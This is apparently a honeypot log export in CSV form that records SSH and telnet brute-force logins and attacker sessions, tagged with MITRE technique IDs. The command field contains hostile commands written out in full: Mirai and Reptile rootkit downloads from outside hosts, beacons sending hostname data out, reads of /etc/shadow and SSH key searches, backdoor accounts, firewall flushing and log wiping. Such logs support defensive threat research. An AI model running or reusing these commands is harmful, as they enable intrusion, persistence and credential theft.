event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-003165,34CF18B0,2025-06-15T11:28:45Z,command_executed,hp-us-01,45.142.212.100,34731,10.0.2.10,2222,ssh,grafana,icatch99,True,history -c,16,RU,AS197695,Reg.ru,Botnet/DDoS,T1070.003,Clear Command History,low,,,,265,211,174,botnet_ddos,False,,6c2aff9e-2fce-412b-bb12-78fbb6ebd52d,
EVT-003163,34CF18B0,2025-06-15T11:28:49Z,command_executed,hp-us-01,45.142.212.100,39353,10.0.2.10,2222,ssh,grafana,icatch99,True,curl -sk http://194.165.16.11/report?h=$(hostname -s)&ip=$(curl -s ifconfig.me 2>/dev/null)&arch=$(arch),14,RU,AS197695,Reg.ru,Botnet/DDoS,T1082,System Information Discovery,medium,yes,194.165.16.11,7f8910dc99b245e887f4ab34559a218d,265,221,109,botnet_ddos,True,,37f631bd-8f0a-4c50-8978-5742647f8a6c,
EVT-003153,34CF18B0,2025-06-15T11:29:17Z,command_executed,hp-us-01,45.142.212.100,45355,10.0.2.10,2222,ssh,grafana,icatch99,True,ls /tmp /var/tmp /dev/shm 2>/dev/null,4,RU,AS197695,Reg.ru,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,265,138,494,botnet_ddos,False,,caa968a9-2bba-41b4-8474-d2cd71fcef76,
EVT-003156,34CF18B0,2025-06-15T11:29:31Z,command_executed,hp-us-01,45.142.212.100,34843,10.0.2.10,2222,ssh,grafana,icatch99,True,wget -q http://194.165.16.11/bins/mirai.x86 -O /tmp/mirai && chmod 777 /tmp/mirai,7,RU,AS197695,Reg.ru,Botnet/DDoS,T1105,Ingress Tool Transfer,medium,yes,194.165.16.11,1d128c55184341e1a9cb562ca1746024,265,301,153,botnet_ddos,False,,71014b9e-342a-47a4-ab3b-53a33062454e,
EVT-003154,34CF18B0,2025-06-15T11:30:10Z,command_executed,hp-us-01,45.142.212.100,42854,10.0.2.10,2222,ssh,grafana,icatch99,True,df -h / | tail -1 | awk '{print $4}',5,RU,AS197695,Reg.ru,Botnet/DDoS,T1082,System Information Discovery,low,,,,265,563,205,botnet_ddos,False,,5b334094-2e44-402c-bb43-14dee891948e,
EVT-003158,34CF18B0,2025-06-15T11:31:19Z,command_executed,hp-us-01,45.142.212.100,37839,10.0.2.10,2222,ssh,grafana,icatch99,True,cd /tmp && /tmp/mirai &,9,RU,AS197695,Reg.ru,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,265,111,448,botnet_ddos,False,,270807d5-556d-4e94-a61e-e9cd67a5ac73,
EVT-003164,34CF18B0,2025-06-15T11:32:10Z,command_executed,hp-us-01,45.142.212.100,53633,10.0.2.10,2222,ssh,grafana,icatch99,True,rm -f /tmp/mirai.arm /tmp/mirai.x86 /tmp/mirai.mips,15,RU,AS197695,Reg.ru,Botnet/DDoS,T1059,Command and Scripting Interpreter,low,,,,265,264,221,botnet_ddos,False,,b907faba-cf7b-42ed-898d-19c6bedaa2cb,
EVT-003161,34CF18B0,2025-06-15T11:33:13Z,command_executed,hp-us-01,45.142.212.100,40220,10.0.2.10,2222,ssh,grafana,icatch99,True,iptables -F,12,RU,AS197695,Reg.ru,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,265,587,114,botnet_ddos,False,,300ad9e7-07e7-4185-b8eb-906604619f4e,
EVT-003159,34CF18B0,2025-06-15T11:34:25Z,command_executed,hp-us-01,45.142.212.100,36918,10.0.2.10,2222,ssh,grafana,icatch99,True,iptables -A INPUT -j ACCEPT,10,RU,AS197695,Reg.ru,Botnet/DDoS,T1562.004,Disable Firewall,low,,,,265,566,204,botnet_ddos,False,,6b4fbf0f-8cde-476d-afe5-b352d299d910,
EVT-003162,34CF18B0,2025-06-15T11:37:10Z,command_executed,hp-us-01,45.142.212.100,45567,10.0.2.10,2222,ssh,grafana,icatch99,True,echo '*/5 * * * * /tmp/mirai' | crontab -,13,RU,AS197695,Reg.ru,Botnet/DDoS,T1053.003,Scheduled Task: Cron,low,,,,265,414,269,botnet_ddos,False,,704ac681-96ff-4380-9d1f-5f269252eb88,
EVT-000057,82E94F08,2025-06-15T12:10:22Z,login_attempt,hp-br-01,46.101.90.205,58401,10.0.4.10,22,ssh,ec2-user,Admin@2023,False,,0,DE,AS14061,DigitalOcean DE,Botnet/DDoS,T1110,Brute Force,medium,,,,38,437,2918,brute_force,False,,,
EVT-002071,713A3A44,2025-06-15T20:03:01Z,login_attempt,hp-eu-02,80.82.77.139,37270,10.0.1.11,2222,ssh,zabbix,default,False,,0,NL,AS29073,Quasi Networks,Credential Dumping,T1110,Brute Force,medium,,,,555,426,978,brute_force,False,,,
EVT-002943,E8F4FBA5,2025-06-16T04:11:50Z,login_attempt,hp-eu-01,117.50.172.82,40747,10.0.1.10,2222,ssh,www-data,root123,False,,0,CN,AS37963,Alibaba Cloud,Rootkit/Persistence,T1110,Brute Force,medium,,,,317,792,1004,brute_force,False,,,
EVT-002099,066ABFFE,2025-06-16T13:29:07Z,login_attempt,hp-ap-01,185.220.101.47,57623,10.0.3.10,2222,ssh,jenkins,test123,True,,0,DE,AS204837,HostSlick,Credential Dumping,T1110,Brute Force,high,,,,316,883,2798,compromised_login,False,,c3bbb148-922e-4233-a239-7a84ea7ea772,
EVT-002101,066ABFFE,2025-06-16T13:29:33Z,command_executed,hp-ap-01,185.220.101.47,35749,10.0.3.10,2222,ssh,jenkins,test123,True,cat /etc/shadow,2,DE,AS204837,HostSlick,Credential Dumping,T1003.008,Passwd and Shadow,critical,,,,316,167,216,credential_dumping,False,,cd304a2b-5ff8-4514-a686-1286a8a5977d,
EVT-002100,066ABFFE,2025-06-16T13:29:48Z,command_executed,hp-ap-01,185.220.101.47,45179,10.0.3.10,2222,ssh,jenkins,test123,True,id && uname -a,1,DE,AS204837,HostSlick,Credential Dumping,T1082,System Information Discovery,low,,,,316,358,392,credential_dumping,False,,e07cf802-0bfd-420a-b388-de3196e66aa3,
EVT-002110,066ABFFE,2025-06-16T13:30:02Z,command_executed,hp-ap-01,185.220.101.47,57398,10.0.3.10,2222,ssh,jenkins,test123,True,grep -r 'password' /etc/nagios/ /etc/zabbix/ /etc/prometheus/ 2>/dev/null | head -20,11,DE,AS204837,HostSlick,Credential Dumping,T1552.001,Credentials in Files,low,,,,316,280,346,credential_dumping,False,,dcd2de6f-8d2a-41e6-b81c-c83b3cd8a6a0,
EVT-002102,066ABFFE,2025-06-16T13:30:13Z,command_executed,hp-ap-01,185.220.101.47,48474,10.0.3.10,2222,ssh,jenkins,test123,True,cat /etc/gshadow 2>/dev/null,3,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,critical,,,,316,501,139,credential_dumping,False,,de1470db-2862-4f39-bbc2-fe245dc9d59a,
EVT-002108,066ABFFE,2025-06-16T13:30:37Z,command_executed,hp-ap-01,185.220.101.47,52777,10.0.3.10,2222,ssh,jenkins,test123,True,cat /home/*/.bash_history 2>/dev/null | grep -iE 'ssh|scp|pass|key|ftp|curl|wget',9,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,medium,yes,,f55a06d705f142f2881e149758b49899,316,256,425,credential_dumping,False,,8fb41e34-fac0-4026-b0dd-91b061117bf9,
EVT-002104,066ABFFE,2025-06-16T13:31:07Z,command_executed,hp-ap-01,185.220.101.47,55313,10.0.3.10,2222,ssh,jenkins,test123,True,find / -name '*.kdbx' -o -name 'keepass*.xml' 2>/dev/null,5,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,422,72,credential_dumping,False,,c9c16206-9c94-4352-a980-4ff840448e28,
EVT-002103,066ABFFE,2025-06-16T13:31:31Z,command_executed,hp-ap-01,185.220.101.47,57197,10.0.3.10,2222,ssh,jenkins,test123,True,find / -name 'shadow' -o -name '.htpasswd' -o -name 'passwd.db' 2>/dev/null | head,4,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,critical,,,,316,517,98,credential_dumping,False,,b36d7bc1-14bf-4be7-8a46-6f4e91056831,
EVT-002112,066ABFFE,2025-06-16T13:32:09Z,command_executed,hp-ap-01,185.220.101.47,58373,10.0.3.10,2222,ssh,jenkins,test123,True,cat /root/.netrc 2>/dev/null,13,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,480,277,credential_dumping,False,,daa854e8-1a41-419c-9960-857bcf6f1da9,
EVT-002105,066ABFFE,2025-06-16T13:32:19Z,command_executed,hp-ap-01,185.220.101.47,37017,10.0.3.10,2222,ssh,jenkins,test123,True,find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name '*.ppk' 2>/dev/null,6,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,191,389,credential_dumping,False,,d4fc31f6-8d3a-4aaf-a738-82aa0f976b09,
EVT-002109,066ABFFE,2025-06-16T13:32:37Z,command_executed,hp-ap-01,185.220.101.47,55162,10.0.3.10,2222,ssh,jenkins,test123,True,"python3 -c ""import base64; import os; [print(f) for f in os.listdir('/proc') if f.isdigit() and 'lsass' in open(f'/proc/{f}/status').read()]"" 2>/dev/null",10,DE,AS204837,HostSlick,Credential Dumping,T1059.006,Python,medium,,,,316,370,148,credential_dumping,False,,5cfae51e-767e-4b61-b356-27f6347a2240,
EVT-002113,066ABFFE,2025-06-16T13:32:37Z,command_executed,hp-ap-01,185.220.101.47,56689,10.0.3.10,2222,ssh,jenkins,test123,True,find / -name '*.json' | xargs grep -l 'private_key\|client_secret\|api_key' 2>/dev/null | head,14,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,273,263,credential_dumping,False,,a6ff9f77-5aea-41f9-ad2c-c8a066e8f964,
EVT-002106,066ABFFE,2025-06-16T13:33:47Z,command_executed,hp-ap-01,185.220.101.47,47606,10.0.3.10,2222,ssh,jenkins,test123,True,find / -name '*.p12' -o -name '*.pfx' -o -name '*.jks' 2>/dev/null,7,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,480,314,credential_dumping,False,,2b7c2f8c-414f-4d58-a2c6-0923f0b500f9,
EVT-002107,066ABFFE,2025-06-16T13:34:51Z,command_executed,hp-ap-01,185.220.101.47,41340,10.0.3.10,2222,ssh,jenkins,test123,True,ls /home/*/.ssh/ 2>/dev/null,8,DE,AS204837,HostSlick,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,316,553,221,credential_dumping,False,,4b19494e-50ac-4704-989a-767b981b4cf4,
EVT-002111,066ABFFE,2025-06-16T13:36:19Z,command_executed,hp-ap-01,185.220.101.47,36561,10.0.3.10,2222,ssh,jenkins,test123,True,cat /var/lib/jenkins/credentials.xml 2>/dev/null,12,DE,AS204837,HostSlick,Credential Dumping,T1552.001,Credentials in Files,low,,,,316,576,446,credential_dumping,False,,3b1bb487-3e6b-444c-93de-2678603cd18d,
EVT-002114,066ABFFE,2025-06-16T13:38:07Z,command_executed,hp-ap-01,185.220.101.47,42712,10.0.3.10,2222,ssh,jenkins,test123,True,history -c,15,DE,AS204837,HostSlick,Credential Dumping,T1070.003,Clear Command History,low,,,,316,316,323,credential_dumping,False,,c5e30ae7-2c96-4d03-9ee9-afe334ee79cc,
EVT-001389,DFC4AF49,2025-06-16T23:35:02Z,login_attempt,hp-ap-01,80.82.77.139,52288,10.0.3.10,2222,ssh,zabbix,raspberry,False,,0,NL,AS29073,Quasi Networks,Credential Dumping,T1110,Brute Force,medium,,,,291,389,2889,brute_force,False,,,
EVT-001844,10D784A8,2025-06-16T23:58:03Z,login_attempt,hp-br-01,89.248.167.131,46055,10.0.4.10,23,telnet,centos,anko,False,,0,NL,AS4785,WorldStream,Rootkit/Persistence,T1110,Brute Force,medium,,,,190,728,2946,brute_force,False,,,
EVT-000427,36E95C16,2025-06-17T04:36:11Z,login_attempt,hp-ap-01,185.129.62.62,58694,10.0.3.10,23,telnet,jenkins,Spring2024!,False,,0,DK,AS29791,Zayo,Network Reconnaissance,T1110,Brute Force,medium,,,,163,476,2722,brute_force,False,,,
EVT-001691,408D86EB,2025-06-17T06:39:14Z,login_attempt,hp-br-01,43.242.116.211,39673,10.0.4.10,22,ssh,nagios,Admin@2023,False,,0,HK,AS45102,Alibaba HK,Botnet/DDoS,T1110,Brute Force,medium,,,,308,897,1471,brute_force,False,,,
EVT-000180,3BBE7E75,2025-06-17T09:50:41Z,login_attempt,hp-us-01,178.128.83.165,48499,10.0.2.10,22,ssh,operator,qwerty,False,,0,SG,AS14061,DigitalOcean SG,Redis Exploitation,T1110,Brute Force,medium,,,,487,863,2424,brute_force,False,,,
EVT-000162,7EE9F0F1,2025-06-17T17:40:27Z,login_attempt,hp-eu-02,162.243.143.105,52312,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,,0,US,AS14061,DigitalOcean,Rootkit/Persistence,T1110,Brute Force,high,,,,12,859,2179,compromised_login,False,,1b2d358d-aca9-4ecd-a921-f182a5718e49,
EVT-000163,7EE9F0F1,2025-06-17T17:40:50Z,command_executed,hp-eu-02,162.243.143.105,41845,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,uname -a && uname -r,1,US,AS14061,DigitalOcean,Rootkit/Persistence,T1082,System Information Discovery,low,,,,12,252,358,rootkit_persistence,False,,dfc58315-9095-4f76-9755-33911b08c075,
EVT-000173,7EE9F0F1,2025-06-17T17:41:11Z,command_executed,hp-eu-02,162.243.143.105,44103,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,echo 'svc_monitor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,11,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,141,62,rootkit_persistence,False,,2f98bf6a-d231-4fd5-bb6b-1af99a88e45c,
EVT-000174,7EE9F0F1,2025-06-17T17:41:27Z,command_executed,hp-eu-02,162.243.143.105,39076,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,"useradd -m -s /bin/bash -G sudo,root svc_monitor 2>/dev/null",12,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059.004,Unix Shell,low,,,,12,304,348,rootkit_persistence,False,,bb5d751f-13d3-4646-8f05-0fb602df2a0a,
EVT-000164,7EE9F0F1,2025-06-17T17:41:33Z,command_executed,hp-eu-02,162.243.143.105,51403,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,lsmod | head -20,2,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,463,393,rootkit_persistence,False,,936e361d-3191-41fe-8f1f-9366e25aa4ca,
EVT-000165,7EE9F0F1,2025-06-17T17:42:06Z,command_executed,hp-eu-02,162.243.143.105,47316,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,dmesg | tail -10,3,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,555,133,rootkit_persistence,False,,bc4d973a-4d85-45df-b2e1-74bbe9f0b492,
EVT-000170,7EE9F0F1,2025-06-17T17:42:27Z,command_executed,hp-eu-02,162.243.143.105,36909,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,insmod /lib/modules/$(uname -r)/extra/reptile.ko 2>/dev/null,8,US,AS14061,DigitalOcean,Rootkit/Persistence,T1082,System Information Discovery,low,,,,12,204,320,rootkit_persistence,False,,77663f23-1598-457b-9e0f-f5d44ce8a0e6,
EVT-000166,7EE9F0F1,2025-06-17T17:42:51Z,command_executed,hp-eu-02,162.243.143.105,48732,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,setenforce 0 2>/dev/null; systemctl stop apparmor 2>/dev/null,4,US,AS14061,DigitalOcean,Rootkit/Persistence,T1562.001,Disable Security Tools,low,,,,12,387,314,rootkit_persistence,False,,977dc9b2-abdf-4ec6-bb74-0f4952b641ce,
EVT-000178,7EE9F0F1,2025-06-17T17:42:51Z,command_executed,hp-eu-02,162.243.143.105,38254,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,systemctl enable sshd 2>/dev/null && systemctl start sshd 2>/dev/null,16,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,122,460,rootkit_persistence,False,,be1cecca-6401-4ff8-b084-3caf0b753acc,
EVT-000172,7EE9F0F1,2025-06-17T17:42:57Z,command_executed,hp-eu-02,162.243.143.105,37153,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,sed -i '/reptile/d' /var/log/syslog /var/log/kern.log 2>/dev/null,10,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,305,434,rootkit_persistence,False,,47902eb0-cdce-4a78-a75a-e27b6213bdf6,
EVT-000167,7EE9F0F1,2025-06-17T17:43:07Z,command_executed,hp-eu-02,162.243.143.105,58294,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,apt-get update -qq && apt-get install -y -qq gcc make libssl-dev 2>/dev/null,5,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,180,287,rootkit_persistence,True,,ccd9d581-b34d-4603-827c-87ff29b88d05,
EVT-000169,7EE9F0F1,2025-06-17T17:43:36Z,command_executed,hp-eu-02,162.243.143.105,47053,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,tar xzf reptile.tar.gz && cd reptile && make install 2>/dev/null,7,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,401,464,rootkit_persistence,False,,caa76d13-5084-4d2e-82d2-a8c53be2fd36,
EVT-000168,7EE9F0F1,2025-06-17T17:43:39Z,command_executed,hp-eu-02,162.243.143.105,39084,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,cd /tmp && curl -O http://91.92.251.103/rootkit/reptile.tar.gz,6,US,AS14061,DigitalOcean,Rootkit/Persistence,T1105,Ingress Tool Transfer,medium,yes,91.92.251.103,4392400e1f084d8cb39b64c643e8d8d7,12,204,216,rootkit_persistence,False,,4cd70705-3814-474c-a6b0-386b0ebaf768,
EVT-000175,7EE9F0F1,2025-06-17T17:43:55Z,command_executed,hp-eu-02,162.243.143.105,49711,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,echo 'svc_monitor:Tr0ub4dor&3' | chpasswd,13,US,AS14061,DigitalOcean,Rootkit/Persistence,T1059,Command and Scripting Interpreter,low,,,,12,86,134,rootkit_persistence,False,,89e1170d-df89-4b7f-8bbc-66276e60ff50,
EVT-000179,7EE9F0F1,2025-06-17T17:44:59Z,command_executed,hp-eu-02,162.243.143.105,58930,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,rm -rf /tmp/reptile* && history -c,17,US,AS14061,DigitalOcean,Rootkit/Persistence,T1070.003,Clear Command History,low,,,,12,489,448,rootkit_persistence,False,,531732d2-a215-4703-a23c-c59a8112fc4d,
EVT-000171,7EE9F0F1,2025-06-17T17:46:00Z,command_executed,hp-eu-02,162.243.143.105,57495,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,echo '/lib/modules/$(uname -r)/extra/reptile.ko' >> /etc/modules,9,US,AS14061,DigitalOcean,Rootkit/Persistence,T1082,System Information Discovery,low,,,,12,80,97,rootkit_persistence,False,,b7b7e54c-bb91-47e1-802a-1f535410667e,
EVT-000177,7EE9F0F1,2025-06-17T17:46:27Z,command_executed,hp-eu-02,162.243.143.105,40759,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,chattr +i /etc/passwd /etc/shadow /etc/sudoers /root/.ssh/authorized_keys 2>/dev/null,15,US,AS14061,DigitalOcean,Rootkit/Persistence,T1098.004,SSH Authorized Keys,critical,,,,12,379,48,rootkit_persistence,False,,1a711864-0738-446c-b849-1399f15ffd97,
EVT-000176,7EE9F0F1,2025-06-17T17:48:09Z,command_executed,hp-eu-02,162.243.143.105,44317,10.0.1.11,22,ssh,www-data,1q2w3e4r,True,mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... backdoor@ops' >> /root/.ssh/authorized_keys,14,US,AS14061,DigitalOcean,Rootkit/Persistence,T1098.004,SSH Authorized Keys,high,,,,12,455,217,rootkit_persistence,False,,ec7a006a-d31a-499b-a203-1802b8c19ee7,
EVT-001390,1056ADD4,2025-06-17T22:03:21Z,login_attempt,hp-us-01,91.92.251.103,35871,10.0.2.10,23,telnet,chef,icatch99,True,,0,NL,AS9009,M247,Supply Chain Abuse,T1110,Brute Force,high,,,,391,434,2344,compromised_login,False,,5a2365f7-7174-4e81-9099-80fb2d141174,
EVT-001391,1056ADD4,2025-06-17T22:03:24Z,command_executed,hp-us-01,91.92.251.103,33130,10.0.2.10,23,telnet,chef,icatch99,True,uname -a && id,1,NL,AS9009,M247,Supply Chain Abuse,T1082,System Information Discovery,low,,,,391,582,295,supply_chain_abuse,False,,b84ec220-b891-4bc5-aeaf-871757f55ce4,
EVT-001397,1056ADD4,2025-06-17T22:04:03Z,command_executed,hp-us-01,91.92.251.103,50674,10.0.2.10,23,telnet,chef,icatch99,True,find / -name 'package.json' -not -path '*/node_modules/*' 2>/dev/null | head,7,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,316,350,supply_chain_abuse,False,,900d8639-dcfe-439e-baa6-96ebc4d1c7fd,
EVT-001394,1056ADD4,2025-06-17T22:04:13Z,command_executed,hp-us-01,91.92.251.103,50635,10.0.2.10,23,telnet,chef,icatch99,True,npm list -g 2>/dev/null | head -20,4,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,381,348,supply_chain_abuse,False,,cce2bd11-e4e5-4bc5-b59e-6851ba53e5ea,
EVT-001395,1056ADD4,2025-06-17T22:04:16Z,command_executed,hp-us-01,91.92.251.103,58935,10.0.2.10,23,telnet,chef,icatch99,True,cat /usr/local/lib/python3*/dist-packages/requests/__init__.py | head -5,5,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,391,223,supply_chain_abuse,False,,01fc7acc-024c-476f-8505-6dc023936e9b,
EVT-001392,1056ADD4,2025-06-17T22:04:31Z,command_executed,hp-us-01,91.92.251.103,48829,10.0.2.10,23,telnet,chef,icatch99,True,which pip pip3 npm yarn gem composer 2>/dev/null,2,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,180,138,supply_chain_abuse,False,,142119d2-3e6b-4115-8ccc-5d30d8068ddb,
EVT-001393,1056ADD4,2025-06-17T22:05:03Z,command_executed,hp-us-01,91.92.251.103,54025,10.0.2.10,23,telnet,chef,icatch99,True,pip3 list 2>/dev/null | grep -iE 'django|flask|requests|paramiko',3,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,337,67,supply_chain_abuse,False,,565d5d08-c4bc-4965-904e-d893a8a2e87b,
EVT-001398,1056ADD4,2025-06-17T22:05:29Z,command_executed,hp-us-01,91.92.251.103,33346,10.0.2.10,23,telnet,chef,icatch99,True,curl -fsSL https://raw.githubusercontent.com/evil-repo/malicious-pkg/main/install.sh | bash,8,NL,AS9009,M247,Supply Chain Abuse,T1105,Ingress Tool Transfer,medium,yes,,63a22ca697a44d809332b17ab22826fe,391,244,400,supply_chain_abuse,False,,88065f8b-c107-4cd7-bda9-3fe55bd6e4af,
EVT-001402,1056ADD4,2025-06-17T22:06:21Z,command_executed,hp-us-01,91.92.251.103,53173,10.0.2.10,23,telnet,chef,icatch99,True,history -c,12,NL,AS9009,M247,Supply Chain Abuse,T1070.003,Clear Command History,low,,,,391,121,307,supply_chain_abuse,False,,2fec1eea-fdbf-4a10-b63c-5cc927e4ed28,
EVT-001396,1056ADD4,2025-06-17T22:06:33Z,command_executed,hp-us-01,91.92.251.103,49713,10.0.2.10,23,telnet,chef,icatch99,True,find / -name 'requirements*.txt' 2>/dev/null | head,6,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,371,484,supply_chain_abuse,False,,fb3206dc-ba3d-4fde-b76c-ec7c381eddc2,
EVT-001399,1056ADD4,2025-06-17T22:08:09Z,command_executed,hp-us-01,91.92.251.103,46264,10.0.2.10,23,telnet,chef,icatch99,True,pip3 install --index-url http://194.165.16.11/pypi/ requests-patched 2>/dev/null,9,NL,AS9009,M247,Supply Chain Abuse,T1195.001,Compromise Software Supply Chain,critical,,194.165.16.11,,391,317,336,supply_chain_abuse,False,,05a7ce9e-772e-4953-9bf2-ef2308ed7125,
EVT-001401,1056ADD4,2025-06-17T22:08:40Z,command_executed,hp-us-01,91.92.251.103,47773,10.0.2.10,23,telnet,chef,icatch99,True,find / -name 'site-packages' 2>/dev/null | xargs ls 2>/dev/null | grep requests,11,NL,AS9009,M247,Supply Chain Abuse,T1059,Command and Scripting Interpreter,low,,,,391,300,88,supply_chain_abuse,False,,8e38f380-4827-4e06-bfd5-8de223beeea1,
EVT-001400,1056ADD4,2025-06-17T22:10:11Z,command_executed,hp-us-01,91.92.251.103,56959,10.0.2.10,23,telnet,chef,icatch99,True,"python3 -c ""import requests; requests.get('http://194.165.16.11/callback?h=$(hostname)&u=$(id -un)')""",10,NL,AS9009,M247,Supply Chain Abuse,T1082,System Information Discovery,medium,,194.165.16.11,,391,329,81,supply_chain_abuse,False,,8a7d7732-63a5-46b9-a3a9-78a05a586f79,
EVT-000534,3C24B07B,2025-06-18T14:27:22Z,login_attempt,hp-eu-02,77.247.181.165,34507,10.0.1.11,2222,ssh,ftpuser,Juniper1!,False,,0,NL,AS43350,NForce,Credential Dumping,T1110,Brute Force,medium,,,,103,466,1253,brute_force,False,,,
EVT-003395,07E98F6D,2025-06-18T16:38:59Z,login_attempt,hp-ap-01,178.128.83.165,58912,10.0.3.10,2222,ssh,support,default,True,,0,SG,AS14061,DigitalOcean SG,Credential Dumping,T1110,Brute Force,high,,,,67,416,935,compromised_login,False,,1f23c830-72ba-45e9-95cd-cdf0b5caffe0,
EVT-003400,07E98F6D,2025-06-18T16:39:24Z,command_executed,hp-ap-01,178.128.83.165,53418,10.0.3.10,2222,ssh,support,default,True,find / -name '*.kdbx' -o -name 'keepass*.xml' 2>/dev/null,5,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,309,134,credential_dumping,False,,3acab8a6-9504-49e1-a225-4bc6ebd24b92,
EVT-003396,07E98F6D,2025-06-18T16:39:29Z,command_executed,hp-ap-01,178.128.83.165,48363,10.0.3.10,2222,ssh,support,default,True,id && uname -a,1,SG,AS14061,DigitalOcean SG,Credential Dumping,T1082,System Information Discovery,low,,,,67,373,43,credential_dumping,False,,f08c42f6-18e6-4363-b9a4-ed198bbb71d1,
EVT-003401,07E98F6D,2025-06-18T16:39:35Z,command_executed,hp-ap-01,178.128.83.165,50318,10.0.3.10,2222,ssh,support,default,True,find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name '*.ppk' 2>/dev/null,6,SG,AS14061,DigitalOcean SG,Credential Dumping,T1059,Command and Scripting Interpreter,low,,,,67,487,78,credential_dumping,False,,e318cba9-ac61-48cd-912b-ae22cf498336,
EVT-003397,07E98F6D,2025-06-18T16:39:51Z,command_executed,hp-ap-01,178.128.83.165,52123,10.0.3.10,2222,ssh,support,default,True,cat /etc/shadow,2,SG,AS14061,DigitalOcean SG,Credential Dumping,T1003.008,Passwd and Shadow,critical,,,,67,109,349,credential_dumping,False,,af0919aa-94a8-47b5-9fec-b4514417a9ae,
